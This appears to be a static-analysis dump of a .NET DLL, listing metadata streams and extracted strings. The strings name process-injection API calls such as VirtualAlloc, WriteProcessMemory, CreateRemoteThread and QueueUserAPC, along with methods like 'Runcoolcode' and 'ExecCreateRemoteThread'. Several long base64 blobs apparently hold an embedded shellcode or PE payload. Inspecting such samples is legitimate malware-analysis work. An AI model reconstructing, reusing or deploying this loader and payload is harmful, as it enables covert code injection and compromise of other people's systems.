Metadata Signature: 0x98c 0x10001424a5342 12
.NET Version: v4.0.30319
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: 7a4
Stream name: #~ 4
DirectoryAddress: 810 Size: 80c
Stream name: #Strings 12
DirectoryAddress: 101c Size: a9af0
Stream name: #US 4
DirectoryAddress: aab0c Size: 10
Stream name: #GUID 8
DirectoryAddress: aab1c Size: 298
Stream name: #Blob 8
[Strings]
nth paddr      vaddr       len  size section type    string
77  0x000014bc 0x1800030bc 12   13   .text   ascii   ThreadAccess
78  0x000014c9 0x1800030c9 19   20   .text   ascii   PROCESS_INFORMATION
79  0x000014dd 0x1800030dd 11   12   .text   ascii   STARTUPINFO
80  0x000014e9 0x1800030e9 6    7    .text   ascii   method
81  0x000014f0 0x1800030f0 10   11   .text   ascii   MEM_COMMIT
82  0x000014fb 0x1800030fb 17   18   .text   ascii   PAGE_EXECUTE_READ
83  0x0000150d 0x18000310d 14   15   .text   ascii   PAGE_READWRITE
84  0x0000151c 0x18000311c 11   12   .text   ascii   PROCESS_ALL
85  0x00001528 0x180003128 9    10   .text   ascii   CPlApplet
86  0x00001532 0x180003132 19   20   .text   ascii   DllUnRegisterServer
87  0x00001546 0x180003146 11   12   .text   ascii   Runcoolcode
88  0x00001552 0x180003152 16   17   .text   ascii   ExecCreateThread
89  0x00001563 0x180003163 8    9    .text   ascii   coolcode
90  0x0000156c 0x18000316c 22   23   .text   ascii   ExecCreateRemoteThread
91  0x00001583 0x180003183 7    8    .text   ascii   process
92  0x0000158b 0x18000318b 16   17   .text   ascii   ExecQueueUserAPC
93  0x0000159c 0x18000319c 5    6    .text   ascii   Clean
94  0x000015a2 0x1800031a2 8    9    .text   ascii   hProcess
95  0x000015ab 0x1800031ab 7    8    .text   ascii   address
96  0x000015b3 0x1800031b3 6    7    .text   ascii   length
97  0x000015ba 0x1800031ba 6    7    .text   ascii   target
98  0x000015c1 0x1800031c1 12   13   .text   ascii   StartProcess
99  0x000015ce 0x1800031ce 13   14   .text   ascii   CreateProcess
100 0x000015dc 0x1800031dc 17   18   .text   ascii   lpApplicationName
101 0x000015ee 0x1800031ee 13   14   .text   ascii   lpCommandLine
102 0x000015fc 0x1800031fc 19   20   .text   ascii   lpProcessAttributes
103 0x00001610 0x180003210 18   19   .text   ascii   lpThreadAttributes
104 0x00001623 0x180003223 15   16   .text   ascii   bInheritHandles
105 0x00001633 0x180003233 15   16   .text   ascii   dwCreationFlags
106 0x00001643 0x180003243 13   14   .text   ascii   lpEnvironment
107 0x00001651 0x180003251 18   19   .text   ascii   lpCurrentDirectory
108 0x00001664 0x180003264 13   14   .text   ascii   lpStartupInfo
109 0x00001672 0x180003272 20   21   .text   ascii   lpProcessInformation
110 0x00001687 0x180003287 18   19   .text   ascii   CreateRemoteThread
111 0x0000169a 0x18000329a 11   12   .text   ascii   dwStackSize
112 0x000016a6 0x1800032a6 14   15   .text   ascii   lpStartAddress
113 0x000016b5 0x1800032b5 11   12   .text   ascii   lpParameter
114 0x000016c1 0x1800032c1 10   11   .text   ascii   lpThreadId
115 0x000016cc 0x1800032cc 12   13   .text   ascii   CreateThread
116 0x000016d9 0x1800032d9 5    6    .text   ascii   param
117 0x000016df 0x1800032df 11   12   .text   ascii   OpenProcess
118 0x000016eb 0x1800032eb 15   16   .text   ascii   dwDesiredAccess
119 0x000016fb 0x1800032fb 14   15   .text   ascii   bInheritHandle
120 0x0000170a 0x18000330a 11   12   .text   ascii   dwProcessId
121 0x00001716 0x180003316 10   11   .text   ascii   OpenThread
122 0x00001721 0x180003321 10   11   .text   ascii   dwThreadId
123 0x0000172c 0x18000332c 12   13   .text   ascii   QueueUserAPC
124 0x00001739 0x180003339 6    7    .text   ascii   pfnAPC
125 0x00001740 0x180003340 7    8    .text   ascii   hThread
126 0x00001748 0x180003348 6    7    .text   ascii   dwData
127 0x0000174f 0x18000334f 12   13   .text   ascii   ResumeThread
128 0x0000175c 0x18000335c 12   13   .text   ascii   VirtualAlloc
129 0x00001769 0x180003369 11   12   .text   ascii   lpStartAddr
130 0x00001775 0x180003375 4    5    .text   ascii   size
131 0x0000177a 0x18000337a 16   17   .text   ascii   flAllocationType
132 0x0000178b 0x18000338b 9    10   .text   ascii   flProtect
133 0x00001795 0x180003395 14   15   .text   ascii   VirtualAllocEx
134 0x000017a4 0x1800033a4 9    10   .text   ascii   lpAddress
135 0x000017ae 0x1800033ae 6    7    .text   ascii   dwSize
136 0x000017b5 0x1800033b5 11   12   .text   ascii   VirtualFree
137 0x000017c1 0x1800033c1 10   11   .text   ascii   dwFreeType
138 0x000017cc 0x1800033cc 13   14   .text   ascii   VirtualFreeEx
139 0x000017da 0x1800033da 14   15   .text   ascii   VirtualProtect
140 0x000017e9 0x1800033e9 12   13   .text   ascii   flNewProtect
141 0x000017f6 0x1800033f6 14   15   .text   ascii   lpflOldProtect
142 0x00001805 0x180003405 16   17   .text   ascii   VirtualProtectEx
143 0x00001816 0x180003416 19   20   .text   ascii   WaitForSingleObject
144 0x0000182a 0x18000342a 7    8    .text   ascii   hHandle
145 0x00001832 0x180003432 14   15   .text   ascii   dwMilliseconds
146 0x00001841 0x180003441 18   19   .text   ascii   WriteProcessMemory
147 0x00001854 0x180003454 13   14   .text   ascii   lpBaseAddress
148 0x00001862 0x180003462 8    9    .text   ascii   lpBuffer
149 0x0000186b 0x18000346b 5    6    .text   ascii   nSize
150 0x00001871 0x180003471 22   23   .text   ascii   lpNumberOfBytesWritten
151 0x00001888 0x180003488 6    7    .text   ascii   .cctor
152 0x0000188f 0x18000348f 7    8    .text   ascii   value__
153 0x00001897 0x180003497 8    9    .text   ascii   Decommit
154 0x000018a0 0x1800034a0 7    8    .text   ascii   Release
155 0x000018a8 0x1800034a8 16   17   .text   ascii   CREATE_NO_WINDOW
156 0x000018b9 0x1800034b9 16   17   .text   ascii   CREATE_SUSPENDED
157 0x000018ca 0x1800034ca 11   12   .text   ascii   SET_CONTEXT
158 0x000018d9 0x1800034d9 10   11   .text   ascii   lpReserved
159 0x000018e4 0x1800034e4 9    10   .text   ascii   lpDesktop
160 0x000018ee 0x1800034ee 7    8    .text   ascii   lpTitle
161 0x000018fe 0x1800034fe 7    8    .text   ascii   dwXSize
162 0x00001906 0x180003506 7    8    .text   ascii   dwYSize
163 0x0000190e 0x18000350e 13   14   .text   ascii   dwXCountChars
164 0x0000191c 0x18000351c 13   14   .text   ascii   dwYCountChars
165 0x0000192a 0x18000352a 15   16   .text   ascii   dwFillAttribute
166 0x0000193a 0x18000353a 7    8    .text   ascii   dwFlags
167 0x00001942 0x180003542 11   12   .text   ascii   wShowWindow
168 0x0000194e 0x18000354e 11   12   .text   ascii   cbReserved2
169 0x0000195a 0x18000355a 11   12   .text   ascii   lpReserved2
170 0x00001966 0x180003566 9    10   .text   ascii   hStdInput
171 0x00001970 0x180003570 10   11   .text   ascii   hStdOutput
172 0x0000197b 0x18000357b 9    10   .text   ascii   hStdError
173 0x00001985 0x180003585 19   20   .text   ascii   DebuggableAttribute
174 0x00001999 0x180003599 14   15   .text   ascii   DebuggingModes
175 0x000019ad 0x1800035ad 2044 4088 .text   utf16le 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
176 0x000029a5 0x1800045a5 2044 4088 .text   utf16le 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
177 0x0000399d 0x18000559d 2044 4088 .text   utf16le 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
